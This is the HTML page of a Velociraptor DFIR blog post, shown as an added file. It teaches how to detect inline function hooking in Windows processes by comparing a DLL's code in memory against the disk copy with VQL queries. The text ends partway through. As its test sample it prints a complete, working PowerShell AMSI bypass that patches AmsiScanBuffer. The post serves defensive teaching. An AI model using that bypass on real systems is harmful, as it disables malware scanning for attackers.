@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html lang="en" class="js csstransforms3d">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="Hugo 0.160.0">
+    <meta name="description" content="This Blog post explores Velociraptor&#39;s memory analysis capabilities.
+">
+
+
+    <link rel="icon" href="/images/favicon.png" type="image/png">
+
+    <title>Memory Analysis with Velociraptor - Part 1 :: Velociraptor - Digging deeper!</title>
+
+    
+    <link href="/css/nucleus.css?1775352328" rel="stylesheet">
+    <link href="/css/font-awesome-all.min.css?1775352328" rel="stylesheet">
+    <link href="/css/featherlight.min.css?1775352328" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css?1775352328" rel="stylesheet">
+    <link href="/css/auto-complete.css?1775352328" rel="stylesheet">
+    <link href="/css/theme.css?1775352328" rel="stylesheet">
+    <link href="/css/tabs.css?1775352328" rel="stylesheet">
+    <link href="/css/hugo-theme.css?1775352328" rel="stylesheet">
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/katex@0.16.25/dist/katex.min.css"
+      integrity="sha384-WcoG4HRXMzYzfCgiyfrySxx90XSl2rxY5mnVY5TwtWE6KLrArNKn0T/mOgNL0Mmi"
+      crossorigin="anonymous"
+      >
+    
+    <link href="/css/theme-mine.css?1775352328" rel="stylesheet">
+    
+    <link href="/css/dark.css?1775352328" rel="stylesheet"><link href="/css/syntax.css?1775352328" rel="stylesheet"><link href="/css/light.css?1775352328" rel="stylesheet"><link href="/css/hljs.css?1775352328" rel="stylesheet"><link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css?1775352328" rel="stylesheet">
+
+    <script src="/js/jquery-3.3.1.min.js?1775352328"></script>
+
+    <style>
+      :root #header + #content > #left > #rlblock_left{
+          display:none !important;
+      }
+      
+    </style>
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-QYH72LMYCS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( true ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-QYH72LMYCS');
+        }
+      </script>
+
+<script>
+
+
+</script>
+
+  </head>
+  <body class="" data-url="/blog/2025/2025-11-15-memory-analysis-pt1/">
+    
+    <script src="/js/theme.js"></script>
+
+<nav id="sidebar" class=""><div id="header-wrapper">
+    <div id="header">
+      <a href="https://docs.velociraptor.app/">
+  <img class="logo dark" src="https://docs.velociraptor.app//images/VeloR7_DarkMode.svg" />
+  <img class="logo light" src="https://docs.velociraptor.app//images/VeloR7_LightMode.svg" />
+</a>
+
+<div class="ThemeSelector darkmode">
+  <i class="fas fa-moon"></i>
+</div>
+
+<div class="ThemeSelector lightmode">
+  <i class="fas fa-sun"></i>
+</div>
+
+<script>
+  const regex = new RegExp('theme=darkmode');
+  if (regex.test(document.cookie)) {
+      $("body").addClass("dark").removeClass("light");
+  } else {
+      $("body").addClass("light").removeClass("dark");
+  }
+
+  $(".ThemeSelector.darkmode").on("click", function(e) {
+      $("body").addClass("dark").removeClass("light");
+      document.cookie = "theme=darkmode;path=/";
+      return false;
+  });
+
+  $(".ThemeSelector.lightmode").on("click", function(e) {
+      $("body").addClass("light").removeClass("dark");
+      document.cookie = "theme=lightmode;path=/";
+      return false;
+  });
+
+</script>
+
+    </div>
+    
+  </div>
+  
+
+    
+    
+       
+    
+
+    
+
+    <script src="/js/menu-b2745250.js" type="text/javascript"></script>
+
+    <div class="highlightable">
+      <ul class="sidemenu sidebar hidden"></ul>
+    <hr />
+    
+    
+      <section id="shortcuts">
+        <h3></h3>
+        <ul>
+          
+              <li>
+                  <a rel="nofollow" class="padding" href="https://github.com/Velocidex/velociraptor"><i class='fab fa-github'></i>GitHub</a>
+              </li>
+          
+              <li>
+                  <a rel="nofollow" class="padding" href="https://docs.velociraptor.app/discord/"><i class='fab fa-discord'></i>Discord</a>
+              </li>
+          
+              <li>
+                  <a rel="nofollow" class="padding" href="https://docs.velociraptor.app/youtube/"><i class='fab fa-youtube'></i>YouTube</a>
+              </li>
+          
+              <li>
+                  <a rel="nofollow" class="padding" href="mailto:velociraptor-discuss@googlegroups.com"><i class='fas fa-envelope'></i>Mailing List</a>
+              </li>
+          
+              <li>
+                  <a rel="nofollow" class="padding" href="https://docs.velociraptor.app/rss/"><i class='fas fa-rss'></i>RSS</a>
+              </li>
+          
+              <li>
+                  <a rel="nofollow" class="padding" href="https://docs.rapid7.com/insightidr/velociraptor-integration/"><i class='fa fa-question-circle'></i>Rapid7 Docs</a>
+              </li>
+          
+        </ul>
+      </section>
+    
+
+    
+    <section id="footer">
+      <div class="footer-copyright">Brought to you by
+  <img src="/images/Rapid7_logo.svg" class="rapid7">
+  <br> <i class="fas fa-copyright"></i> 2025
+</div>
+
+    </section>
+  </div>
+</nav>
+
+<script>
+
+  findlink(window.menu, "\/blog\/2025\/2025-11-15-memory-analysis-pt1\/");
+
+  let menu = $(".sidemenu.hidden");
+  addToNode(menu, window.menu);
+
+  menu.find("i.fa-angle-right").each(function() {
+      $( this ).parent().parent().find("ul").hide();
+  });
+
+  
+  menu.removeClass("hidden");
+
+  
+  $(window).on('load', function(){
+      $("li.dd-item.active").each(function() {
+          $(this)[0].scrollIntoView();
+      })
+  })
+
+  menu.find("li.dd-item.active").each(function() {
+      $(this)[0].scrollIntoView();
+  })
+
+
+  menu.find("li[linkTo]").click(function(e) {
+      let target = $(this).attr("linkTo");
+      return navigateTo(target);
+  });
+
+  
+  $(document).ready(function () {
+      decorateLinks();
+  });
+
+</script>
+
+    
+        <section id="body">
+        <div id="overlay"></div>
+        <div class="padding highlightable scroller">
+          
+          
+          
+          
+          
+             
+              <div>
+                <div id="top-bar">
+                
+                  
+                  
+                  
+                  <div id="top-github-link">
+                    <a class="github-link" title='Edit this page' href="https://github.com/Velocidex/velociraptor-docs/edit/master/content/blog/2025/2025-11-15-memory-analysis-pt1/_index.md" target="blank">
+                      <i class="fas fa-code-branch"></i>
+                      <span id="top-github-link-text">Edit this page</span>
+                    </a>
+                  </div>
+                  
+                
+                
+                <div id="breadcrumbs" itemscope="" itemtype="http://schema.org/BreadcrumbList">
+                    <span id="sidebar-toggle-span">
+                        <a href="#" id="sidebar-toggle" data-sidebar-toggle="">
+                          <i class="fas fa-bars"></i>
+                        </a>
+                    </span>
+                  
+                  <span id="toc-menu"><i class="fas fa-list-alt"></i></span>
+                  
+                  <span class="links" itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem">
+                 
+                 
+                    <span itemprop="item"><span itemprop="name">Memory Analysis with Velociraptor - Part 1</span></span>
+                    <meta itemprop="position" content="1" />
+                 
+                  </span>
+                </div>
+                
+                    <div class="progress">
+    <div class="wrapper">
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#step-1-enumerate-processes-of-interest">Step 1: Enumerate processes of interest</a></li>
+    <li><a href="#step-2-finding-mapped-dlls">Step 2: Finding mapped Dlls</a></li>
+    <li><a href="#step-3-convert-from-kernel-paths-to-filesystem-paths">Step 3: Convert from kernel paths to filesystem paths</a></li>
+    <li><a href="#step-4-parsing-the-dll-from-disk">Step 4: parsing the DLL from disk</a></li>
+    <li><a href="#step-5-comparing-the-memory-regions-with-the-disk">Step 5: Comparing the memory regions with the disk</a></li>
+    <li><a href="#step-6-comparing-memory-to-disk">Step 6: Comparing memory to disk</a></li>
+    <li><a href="#step-7-resolving-the-function-that-was-patched">Step 7: Resolving the function that was patched</a></li>
+    <li><a href="#step-8-handling-relocations">Step 8: Handling relocations</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+                
+              </div>
+            </div>
+            
+        <div id="head-tags">
+        
+<div class="tags">
+
+  <a class="tag-link" href="/tags/dfir">DFIR</a>
+
+  <a class="tag-link" href="/tags/memory">Memory</a>
+
+</div>
+
+        </div>
+        
+        <div id="body-inner">
+          <div id="loading">
+            <i class="fas fa-spinner fa-spin fa-10x"></i>
+          </div>
+          
+            <h1>
+              
+              Memory Analysis with Velociraptor - Part 1
+            </h1>
+            
+            <div class="author pull-right">
+              Mike Cohen
+              <span class="date">2025-11-14</span>
+            </div>
+            
+          
+
+        
+
+
+
+	<p>This post was spurred by the recent release of the
+<a href="/exchange/artifacts/pages/windows.memory.mem2disk/">Windows.Memory.Mem2Disk</a> artifact,
+written by Lautaro Lecumberry and Dr. Michael Denzel. The artifact was
+a culmination of their excellent thesis, <a href="https://github.com/lautarolecumberry/DetectingFilelessMalware" target="_blank" >Detecting Fileless Malware
+using Endpoint Detection and Response
+Tools</a>. You
+should check it out!</p>
+<p>Memory analysis is a powerful technique used in DFIR to detect malware
+and persistence mechanisms which are sometimes not detectable using
+more conventional disk based methods.</p>
+<p>Over the years, frameworks like
+<a href="https://github.com/volatilityfoundation/volatility3" target="_blank" >Volatility</a> or
+<a href="https://github.com/ufrisk/MemProcFS" target="_blank" >MemprocFS</a> have become the
+standard go-to tools when analysts think of memory analysis.  Those
+frameworks usually operate on a static image of physical memory.</p>
+<p>However, this has a number of shortcoming when performing active
+response in modern environments:</p>
+<ol>
+<li>
+<p>In order to obtain the physical memory image (for example, using a
+tool like <a href="https://github.com/Velocidex/WinPmem" target="_blank" >WinPmem</a>) one
+usually needs to load a kernel driver. On hardened endpoints this
+is not always possible, presenting challenges in actually obtaining
+memory images.</p>
+</li>
+<li>
+<p>The size of physical memory is very large in modern systems. Most
+consumer laptops now regularly ship with 16Gb of physical RAM and
+most server class machines have memory sizes in the range of 128Gb
+to 1Tb of Physical RAM.</p>
+<p>A larger RAM size presents challenges for analysis. First, the size
+of the image makes it difficult to store and transport across the
+network. Additionally, the image quality is usually poor due to a
+larger amount of memory smear exasperated during the longer
+acquisition time - making subsequent memory analysis unreliable.</p>
+</li>
+<li>
+<p>Physical memory images are actually not a very good format for
+acquiring the state of the endpoint. This is because operating
+systems use virtual memory and on demand paging. For example, while
+in theory one can dump binaries from running memory using
+e.g. Volatility&rsquo;s <code>procdump</code> plugin, in reality the dumped binaries
+are missing many executable pages, which are not memory
+resident. Instead the operating system will page those binary
+instructions from disk at runtime, if they are needed.</p>
+<p>Therefore capturing physical memory, even if done perfectly and
+without smear, will miss many parts of those things we actually
+need to extract in our analysis - such as binaries, or user data
+(which may be in the page file), etc.</p>
+</li>
+</ol>
+<p><strong>Velociraptor&rsquo;s memory analysis capabilities do not rely on physical memory.</strong>
+Although Velociraptor does have the ability to capture a physical memory image
+(e.g. using the
+<a href="/artifact_references/pages/windows.memory.acquisition/">Windows.Memory.Acquisition</a>
+artifact), we don&rsquo;t recommend this approach. Much of Velociraptor&rsquo;s memory
+capabilities are implemented using plugins which directly query the operating
+system for information about the system (including process memory).</p>
+<p>Many of Velociraptor&rsquo;s memory analysis plugins have equivalent or
+similar plugins in Volatility. Using these plugins allows Velociraptor
+to perform similar analysis to many of Volatility&rsquo;s native physical
+memory analysis modules.</p>
+<p>However, Velociraptor&rsquo;s approach is faster and more scalable since it
+does not need to acquire an image first, and can get perfect
+information as needed. For example, when dumping a binary from memory,
+we automatically cause the OS to page in non-resident pages (simply by
+virtue of reading the page through the API), so the end binary dump is
+perfect and far better than we could get from a physical memory image.</p>
+<p>This blog post is the first in a series of posts describing
+Velociraptor&rsquo;s approach to memory analysis. In each post I will
+compare and contrast Velociraptor&rsquo;s approach to other memory analysis
+frameworks. In particular I will dive into the VQL queries that are
+used to develop such artifacts in order to share my development
+process and point out some of the lesser known capabilities.</p>
+<p>My goal is to convince you to think of Velociraptor&rsquo;s memory analysis
+capability as the <strong>first</strong> port of call when developing new memory-based
+detections! It is far more practical than writing a single use python
+script, and it can be deployed quickly and at scale.</p>
+<p>In this post I will discuss how to detect inline hooking. There are
+many open source tools which implement this kind of detection (for
+example <a href="https://github.com/hasherezade/hollows_hunter" target="_blank" >Hollows
+Hunter</a> which you can
+use with Velociraptor via the <a href="/exchange/artifacts/pages/hollowshunter/">Windows.Memory.HollowsHunter</a> artifact). In this
+post I will describe how this can be implemented purely in VQL.</p>
+<h1 id="inline-hooking-of-binaries">Inline hooking of binaries</h1>
+<p>Inline hooking is a popular technique for subverting a binary by
+patching the function header as it is loaded into memory. For example,
+patching ETW tracing functionality can disable user space ETW reporting,
+such as PowerShell script block logging.</p>
+<p>It is also possible to patch functions in <a href="https://attack.mitre.org/techniques/T1056/004/" target="_blank" >other
+processes</a>, thereby
+subverting them by diverting execution to attacker-controlled code
+injections.</p>
+<p>
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/patching_memory_.svg" alt="Patching a function preamble"
+         class="inline"
+         height="774.8870281243326"
+         width="1331.1480712890623"  />
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="patching_memory.svg"><i class="fa fa-download"></i></a>
+    Patching a function preamble
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>The process is illustrated above. When a DLL is loaded into memory,
+the OS maps its text section (i.e. the actual code of the functions it
+exports) into the process&rsquo;s virtual memory. Normally calling these
+functions causes execution to jump into the function body. However,
+the attacker may want to prevent calling some functions. Therefore,
+they can simply overwrite the front of the function with a return
+instruction causing the function to be bypassed.</p>
+<p>To illustrate this technique, let&rsquo;s examine the following short
+powershell snippet:
+<a href="https://github.com/okankurtuluss/AMSIBypassPatch/blob/090b54a518fecf1ccf8f54f8691805ef0f9a30f1/AMSIBypassPatch.ps1" target="_blank" >AMSIBypassPatch.ps1</a></p>
+<pre><code>function Disable-Protection {
+    $k = @&quot;
+using System;
+using System.Runtime.InteropServices;
+public class P {
+    [DllImport(&quot;kernel32.dll&quot;)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport(&quot;kernel32.dll&quot;)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport(&quot;kernel32.dll&quot;)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static bool Patch() {
+        IntPtr h = GetModuleHandle(&quot;a&quot; + &quot;m&quot; + &quot;s&quot; + &quot;i&quot; + &quot;.dll&quot;);
+        if (h == IntPtr.Zero) return false;
+        IntPtr a = GetProcAddress(h, &quot;A&quot; + &quot;m&quot; + &quot;s&quot; + &quot;i&quot; + &quot;S&quot; + &quot;c&quot; + &quot;a&quot; + &quot;n&quot; + &quot;B&quot; + &quot;u&quot; + &quot;f&quot; + &quot;f&quot; + &quot;e&quot; + &quot;r&quot;);
+        if (a == IntPtr.Zero) return false;
+        UInt32 oldProtect;
+        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
+        byte[] patch = { 0x31, 0xC0, 0xC3 };
+        Marshal.Copy(patch, 0, a, patch.Length);
+        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
+    }
+}
+&quot;@
+    Add-Type -TypeDefinition $k
+    $result = [P]::Patch()
+    if ($result) {
+        Write-Output &quot;Protection Disabled&quot;
+    } else {
+        Write-Output &quot;Failed to Disable Protection&quot;
+    }
+}
+
+Disable-Protection
+</code></pre>
+<p>This code prevents calling <code>AmsiScanBuffer</code> used to scan PowerShell
+code for suspicious constructs:</p>
+<ol>
+<li>It gets a handle to the <code>amsi.dll</code> library.</li>
+<li>It then finds the <code>AmsiScanBuffer</code> function.</li>
+<li>Changes the page protections on the function to allow writing on
+the memory.</li>
+<li>Overwrites the memory with a return op code</li>
+<li>Changes memory protections back.</li>
+</ol>
+<p>You can use this example while reading the following post.</p>
+<h1 id="how-can-we-detect-memory-patching">How can we detect memory patching?</h1>
+<p>The main indicator for memory patching is that the code resident in
+memory is not the same as the code of the DLL on disk. So the approach
+here is to compare the code in memory with the code on disk for each
+DLL.</p>
+<p>I will develop the following in a notebook cell which I am launching
+on a Windows system using <a href="/docs/deployment/#instant-velociraptor">Instant Velociraptor</a>. This approach allows me
+to interactively develop my VQL on a live system in the convenience of
+a GUI notebook without needing to call into a remote client. See
+<a href="/docs/artifacts/tips/">Artifact Writing Tips </a> for more
+details.</p>
+<p>In a separate window I start powershell, and paste the above code into
+it. This will patch <code>amsi.dll</code> so I can use it as a test to develop my
+VQL.</p>
+<h2 id="step-1-enumerate-processes-of-interest">Step 1: Enumerate processes of interest</h2>
+<p>First I list all the processes and identify the powershell process.</p>
+<pre><code class="language-vql">SELECT * FROM pslist()
+WHERE Name =~ &quot;powershell&quot;
+</code></pre>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/pslist.png"
+         class="inline"
+         alt="Filtering processes by name"
+         width="920" height="386">
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="pslist.png">
+      <i class="fa fa-download"></i></a>
+    Filtering processes by name
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>The <a href="/vql_reference/popular/pslist/">pslist()</a> VQL
+plugin is similar to Volatility&rsquo;s <code>pslist</code> plugin - it simply lists
+all active processes and reveals important information about them.</p>
+<p>In this case, I am interested in the process ID (Pid) of the
+powershell process. I want to use that to see all dll&rsquo;s mapped into
+the powershell process&rsquo;s address space.</p>
+<h2 id="step-2-finding-mapped-dlls">Step 2: Finding mapped Dlls</h2>
+<p>I am especially interested in how this process is mapping the
+<code>amsi.dll</code>. Executable dlls are normally mapped into a process address
+space by the kernel when the dll is loaded. I can view the mapped
+sections of a process using the <a href="/vql_reference/windows/vad/">vad()</a> VQL plugin. This plugin is
+equivalent to Volatility&rsquo;s <code>vad</code> plugin, and produces a list of all
+mapped sections in the process. If the section is backed by a file
+then the filename is also given, as well as the memory protections of
+the region.</p>
+<pre><code class="language-vql">SELECT * FROM foreach(row={
+  SELECT * FROM pslist()
+  WHERE Name =~ &quot;powershell&quot;
+}, query={
+  SELECT Pid, Name, *
+  FROM vad(pid=Pid)
+  WHERE MappingName =~ &quot;amsi.dll&quot;
+})
+</code></pre>
+<p>
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/inspecting_vad_.svg" alt="Inspecting the dlls mapped into the process address space"
+         class="inline"
+         height="541"
+         width="1283.030303030303"  />
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="inspecting_vad.svg"><i class="fa fa-download"></i></a>
+    Inspecting the dlls mapped into the process address space
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>As we see above, the region with <code>PAGE_EXECUTE_READ</code> protections which
+is backed by the <code>amsi.dll</code> is the one containing the actual code
+exported by the DLL.</p>
+<p>So our goal is to find the same dll on disk and compare the bytes in
+memory with the bytes on disk.</p>
+<h2 id="step-3-convert-from-kernel-paths-to-filesystem-paths">Step 3: Convert from kernel paths to filesystem paths</h2>
+<p>However, as you can see, the Windows kernel reports the mapping
+filename in kernel path conventions:
+<code>\Device\HarddiskVolume3\Windows\System32\amsi.dll</code> referring to the
+kernel&rsquo;s internal device manager path. We can not use this path to
+directly open the file on disk.</p>
+<p>Somehow, we need to convert <code>\Device\HarddiskVolume3\</code> to <code>C:\</code>. The
+conversion is actually done by the Kernel&rsquo;s object manager depending
+on how the volumes are mounted at the moment. The <code>C:\</code> drive letter
+is simply a symbolic link to the real path as far as the kernel is
+concerned.</p>
+<p>Luckily we can inspect the content of the kernel object manager using
+the <a href="/vql_reference/windows/winobj/">winobj()</a>
+plugin. This is the VQL equivalent of Volatility&rsquo;s <code>winobj</code> plugin. It
+shows the kernel&rsquo;s object manager namespace.</p>
+<p>I won&rsquo;t get into too much detail, but the following VQL code
+translates from kernel paths into file paths using the object manager
+namespace. I just paste this code in my notebook and call it as
+<code>DriveReplace(Path)</code>:</p>
+<pre><code class="language-vql">-- These functions help to resolve the Kernel Device Filenames
+-- into a regular filename with drive letter.
+LET DriveReplaceLookup &lt;= SELECT
+    split(sep_string=&quot;\\&quot;, string=Name)[-1] AS Drive,
+    upcase(string=SymlinkTarget) AS Target,
+    len(list=SymlinkTarget) AS Len
+  FROM winobj()
+  WHERE Name =~ &quot;^\\\\GLOBAL\\?\\?\\\\.:&quot;
+
+LET _DriveReplace(Path) = SELECT Drive + Path[Len:] AS ResolvedPath
+  FROM DriveReplaceLookup
+  WHERE upcase(string=Path[:Len]) = Target
+
+LET DriveReplace(Path) = _DriveReplace(Path=Path)[0].ResolvedPath || Path
+
+SELECT *
+FROM foreach(row={
+  SELECT * FROM pslist()
+  WHERE Name =~ &quot;powershell&quot;
+}, query={
+  SELECT Pid, Name, DriveReplace(Path=MappingName) AS DllName, *
+  FROM vad(pid=Pid)
+  WHERE MappingName =~ &quot;amsi.dll&quot;
+})
+</code></pre>
+<h2 id="step-4-parsing-the-dll-from-disk">Step 4: parsing the DLL from disk</h2>
+<p>In our artifact we would rather just import those utility functions
+from a common artifact (these functions are actually provided by the
+<code>Windows.System.VAD</code> artifact). In this way VQL allows us to
+modularize artifacts and reuse code.</p>
+<p>I also want to format the address in hexadecimal and parse the dll
+from disk using the <a href="/vql_reference/parsers/parse_pe/">parse_pe()</a> plugin.</p>
+<p>Putting it all together:</p>
+<pre><code class="language-vql">LET _ &lt;= import(artifact=&quot;Windows.System.VAD&quot;)
+LET Hex(X) = format(format=&quot;%#x&quot;, args=X)
+
+SELECT * FROM foreach(row={
+    SELECT *
+    FROM pslist()
+    WHERE Name =~ &quot;powershell&quot;
+  },
+             query={
+    SELECT Pid, Name, Hex(X=Address) AS Address,
+           DriveReplace(Path=MappingName) AS Dll,
+           parse_pe(file=DriveReplace(Path=MappingName)) AS PEInfo, *
+    FROM vad(pid=Pid)
+    WHERE MappingName =~ &quot;amsi&quot; AND ProtectionMsg =~ &quot;PAGE_EXECUTE_READ&quot;
+  })
+</code></pre>
+<p>
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/parsing_the_pe_file_.svg" alt="Parsing the mapped DLL from disk"
+         class="inline"
+         height="606"
+         width="1285.127436281859"  />
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="parsing_the_pe_file.svg"><i class="fa fa-download"></i></a>
+    Parsing the mapped DLL from disk
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>In the above we see some important information:</p>
+<ol>
+<li>
+<p>The code of <code>amsi.dll</code> is mapped into the process at virtual
+address <code>0x7ff945181000</code>.</p>
+</li>
+<li>
+<p>By parsing the sections from the dll on disk we can tell the code section  named <code>.text</code> :</p>
+<ul>
+<li>Has a file offset of 4096 bytes inside the PE file.</li>
+<li>The Virtual Memory address preferred by the DLL is 6442455040</li>
+<li>The Relative Virtual Address of the text section is 4096. This is
+relative address (from the DLL load offset) where this section
+starts.</li>
+<li>The size of the section is 73728 bytes.</li>
+</ul>
+</li>
+</ol>
+<p>Although the DLL wants to be loaded at a preferred virtual memory
+address of 6442455040, windows does not actually load at this
+address. Instead it is loaded at 0x7ff945181000. This is because
+Windows tries to randomize the address space by shifting the loading
+location of the dll to a random start location.</p>
+<p>This is called the ASLR shift (Address space layout
+randomization). Let&rsquo;s visualize how it looks in memory:</p>
+<p>
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/memory_vs_disk_.svg" alt="Comparing memory mapped dll to disk offsets"
+         class="inline"
+         height="889.1666666666665"
+         width="1878.333333333333"  />
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="memory_vs_disk.svg"><i class="fa fa-download"></i></a>
+    Comparing memory mapped dll to disk offsets
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>Let&rsquo;s extract the interesting fields from the <code>.text</code> section by
+writing a VQL function to locate the <code>.text</code> section from a DLL on
+disk:</p>
+<pre><code class="language-vql">-- Filter all the PE sections to find the .text section
+LET GetTextSegment(Path) = filter(
+   condition=&quot;x=&gt;x.Name = '.text'&quot;,
+   list=parse_pe(file=Path).Sections)[0]
+
+LET Sections = SELECT Pid, Name, Address, Dll,
+    GetTextSegment(Path=Dll) AS TextSegment
+FROM foreach(row={
+    SELECT * FROM pslist()
+    WHERE Name =~ &quot;powershell&quot;
+  }, query={
+    SELECT Pid, Name, Address,
+           DriveReplace(Path=MappingName) AS Dll, *
+    FROM vad(pid=Pid)
+    WHERE MappingName =~ &quot;amsi&quot;
+      AND ProtectionMsg =~ &quot;PAGE_EXECUTE_READ&quot;
+  })
+
+SELECT *,
+  Hex(X=Address) AS Address,
+  Hex(X=Address - TextSegment.VMA) AS ASLR
+FROM Sections
+</code></pre>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/essential_info.png"
+         class="inline"
+         alt="Isolating the essential information"
+         width="1589" height="434">
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="essential_info.png">
+      <i class="fa fa-download"></i></a>
+    Isolating the essential information
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>The above query calculates the ASLR offset, and gets the essential
+information for the <code>.text</code> section.</p>
+<h2 id="step-5-comparing-the-memory-regions-with-the-disk">Step 5: Comparing the memory regions with the disk</h2>
+<p>Now I will read the <code>.text</code> section from disk and memory. Velociraptor
+allows to read process memory using the <a href="/vql_reference/accessors/process/">process accessor</a>. The accessor makes the
+process memory appear as a huge file, so we can apply any VQL function
+or plugin which expects a file directly on process memory.</p>
+<p>This is useful, for example, in applying the <code>yara()</code> plugin to scan
+memory for patterns. However, in this case I just want to read the
+<code>.text</code> section and compare it with the file on disk. I can use the
+<a href="/vql_reference/popular/read_file/">read_file()</a> VQL
+function to just read the file into a single buffer string (Note that
+when using the process accessor the filename must be of the form
+<code>/&lt;pid&gt;</code>):</p>
+<pre><code>LET PidAsString(Pid) = format(format=&quot;/%d&quot;, args=Pid)
+
+SELECT *,
+       Hex(X=Address) AS Address,
+       Hex(X=Address - TextSegment.VMA) AS ASLR,
+       read_file(offset=TextSegment.FileOffset,
+                 length=TextSegment.Size,
+                 filename=Dll) AS DiskData,
+       read_file(offset=Address,
+                 length=TextSegment.Size,
+                 accessor=&quot;process&quot;,
+                 filename=PidAsString(Pid=Pid)) AS MemoryData
+FROM Sections
+</code></pre>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/reading_process_memory.png"
+         class="inline"
+         alt="Reading process memory and code from disk"
+         width="1584" height="400">
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="reading_process_memory.png">
+      <i class="fa fa-download"></i></a>
+    Reading process memory and code from disk
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<h2 id="step-6-comparing-memory-to-disk">Step 6: Comparing memory to disk</h2>
+<p>Next I need to compare the <code>MemoryData</code> and <code>DiskData</code>. I can start
+with a naive implementation which compares 8 bytes at the time (This
+will be too slow on larger DLLs but for this example it should be fast
+enough):</p>
+<pre><code class="language-vql">LET Compare(MemoryData, DiskData) = SELECT
+    _value AS Offset,
+    MemoryData[_value:(_value + 8)] AS MemoryInt,
+    DiskData[_value:(_value + 8)] AS DiskInt
+  FROM range(end=len(list=MemoryData), step=8)
+  WHERE MemoryInt != DiskInt
+
+SELECT
+    *, Hex(X=Address) AS Address,
+    Hex(X=Address - TextSegment.VMA) AS ASLR,
+    GetTextSegment(Path=Dll) AS TextSegment,
+    Compare(DiskData=read_file(offset=TextSegment.FileOffset,
+                               length=TextSegment.Size,
+                               filename=Dll),
+            MemoryData=read_file(offset=Address,
+                                 length=TextSegment.Size,
+                                 accessor=&quot;process&quot;,
+                                 filename=PidAsString(Pid=Pid))) AS Comparison
+FROM Sections
+</code></pre>
+<p>I first define a <code>Compare</code> VQL function which accepts two buffers
+<code>MemoryData</code> and <code>DiskData</code>. It then iterates over the length of the
+buffers in steps of 8 bytes. For each 8 byte offset, the function gets
+the bytes in both buffers and compares them. The function then shows
+the rows where the memory is different.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+<figure>
+  <div class="figure">
+    <img src="/blog/2025/2025-11-15-memory-analysis-pt1/comparing_process_memory.png"
+         class="inline"
+         alt="Comparing process memory with disk"
+         width="1581" height="270">
+  </div>
+  <figcaption>
+    <a class="image-link"
+       target="_blank" rel="noopener noreferrer"
+       href="comparing_process_memory.png">
+      <i class="fa fa-download"></i></a>
+    Comparing process memory with disk
+  </figcaption>
+</figure>
+
+
+
+
+</p>
+<p>We can see that in this case, a single 8 byte address is different
+between the memory and disk at offset 46080.</p>
+<h2 id="step-7-resolving-the-function-that-was-patched">Step 7: Resolving the function that was patched</h2>
+<p>While it is interesting to see the address of where the memory has
+been modified, we don&rsquo;t know much about this address. It would be nice
+to be able to see what function exactly was patched since it will give
+us more indication of the intent of the patch.</p>
+<p>Since <code>amsi.dll</code> exports a number of functions, we know their relative
+addresses. We can therefore look up which exported function starts
+just before the modified address - chances are this is the function
+the attacker wanted to modify.</p>
+<p>The DLL&rsquo;s export table indicates all the functions that are exported
+from the dll, and their Relative Virtual Addresses (i.e. relative
+address to the base address at which the DLL is loaded).</p>
